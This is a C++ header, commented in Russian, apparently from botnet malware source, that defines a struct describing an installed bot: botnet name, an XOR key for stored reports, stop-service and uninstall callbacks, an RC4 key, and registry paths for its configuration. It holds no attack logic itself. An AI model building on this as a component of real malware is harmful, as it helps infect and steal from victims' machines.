/*
  Структура для получения информации о установленном боте.
*/
#pragma once

#include "malwaretools.h"

namespace BotStatus
{
  //Данные об актвином боте. Версия 1, введено с 1.4.0.0.
  typedef BOOL (WINAPI *callbackStopServices)(void *reserved);
  typedef BOOL (WINAPI *callbackUninstall)(void *reserved);

# pragma pack(push, 1)
  typedef struct
  {
    DWORD structSize;                   //Размер структуры.
    DWORD flags;                        //Не испольузется.
    DWORD version;                      //Версия бота.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //Имя ботнета.
    DWORD storageArrayKey;              //XOR ключ для хранения отчетов.
    
    callbackStopServices stopServices;  //Функция для остановки сервисов бота.
    callbackUninstall uninstall;        //Функция для удаления бота.

    //Привязка.
    DWORD reserved;       //Не используется.
    WCHAR compId[60];     //CompID.
    GUID guid;            //Бинарный GUID ассоциации с ОС.
    Crypt::RC4KEY rc4Key; //Ключ шифрования для ОС.

    //Данные о путях.
    struct
    {
      WCHAR coreFile[MAX_PATH];         //Отностилеьный путь лоадера.
      WCHAR reportFile[MAX_PATH];       //Отностилеьный путь для различных данных.
      WCHAR regKey[MAX_PATH];           //Отностилеьный путь в реестре.
      WCHAR regDynamicConfig[MAX_PATH]; //Занчение в реестре для хранения конфигурации.
      WCHAR regLocalConfig[MAX_PATH];   //Занчение в реестре для хранения локальной конфигурации.
      WCHAR regLocalSettings[MAX_PATH]; //Занчение в реестре для хранения настроек.
    }userPaths;          
  }VER1;
# pragma pack(pop)
};
